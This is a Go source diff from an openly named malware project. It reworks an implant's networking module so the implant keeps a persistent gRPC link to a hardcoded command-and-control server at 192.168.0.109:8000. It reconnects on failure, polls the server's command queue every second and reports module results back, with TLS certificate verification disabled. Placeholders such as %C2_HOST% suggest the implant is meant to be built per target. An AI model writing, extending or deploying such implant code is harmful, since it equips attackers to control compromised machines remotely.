@@ -2,19 +2,22 @@ package basic_tcp_network
 
 import (
 	"context"
+	"crypto/tls"
 	"fmt"
+	"google.golang.org/grpc"
+	"google.golang.org/grpc/connectivity"
+	"google.golang.org/grpc/credentials"
 	"log"
 	"malware/common/messages"
 	pb "malware/common/messages"
 	"malware/common/types"
 	"malware/implant/included_modules"
 	"time"
-
-	"google.golang.org/grpc"
 )
 
 type state struct {
 	running bool
+	conn    *grpc.ClientConn
 	grpc    *grpc.Server
 }
 
@@ -23,8 +26,8 @@ type settings struct {
 	host  string
 }
 
-func (settings settings) doConnection(conn *grpc.ClientConn) {
-	client := pb.NewMalwareClient(conn)
+func (settings settings) doConnection() {
+	client := pb.NewMalwareClient(settings.state.conn)
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
 
@@ -40,25 +43,42 @@ func (settings settings) doConnection(conn *grpc.ClientConn) {
 	fmt.Println(reply)
 	for _, module := range included_modules.Modules {
 		module.HandleMessage(reply, func(reply *messages.ImplantReply) {
+			client := pb.NewMalwareClient(settings.state.conn)
+			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+			defer cancel()
+
 			client.CheckCommandQueue(ctx, &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}})
 		})
 	}
 
 }
 
-func (settings settings) listenServer() {
-	conn, err := grpc.Dial(settings.host, grpc.WithInsecure())
-	if err != nil {
-		log.Fatalf("fail to dial: %v", err)
+func (settings settings) fixConnection() {
+	if settings.state.conn == nil || settings.state.conn.GetState() == connectivity.TransientFailure {
+		if settings.state.conn != nil {
+			settings.state.conn.Close()
+		}
+
+		var clientTLSConfig = &tls.Config{
+			InsecureSkipVerify: true,
+		}
+
+		conn, err := grpc.Dial(settings.host, grpc.WithTransportCredentials(credentials.NewTLS(clientTLSConfig)))
+		if err != nil {
+			log.Fatalf("fail to dial: %v", err)
+		}
+		settings.state.conn = conn
 	}
+}
 
-	defer conn.Close()
-
+func (settings settings) listenServer() {
 	for settings.state.running {
-		settings.doConnection(conn)
+		settings.fixConnection()
+		settings.doConnection()
 
 		time.Sleep(1 * time.Second)
 	}
+	settings.state.conn.Close()
 }
 
 func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.ImplantReply)) {
@@ -66,8 +86,10 @@ func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.I
 }
 
 func Create() types.Module {
-	port := int16(2000)
-	ip := "127.0.0.1"
+	// TODO: Replace with %C2_PORT%
+	// TODO: Replace with %C2_HOST%
+	port := int16(8000)
+	ip := "192.168.0.109"
 	state := state{}
 	host := fmt.Sprintf("%s:%d", ip, port)
 
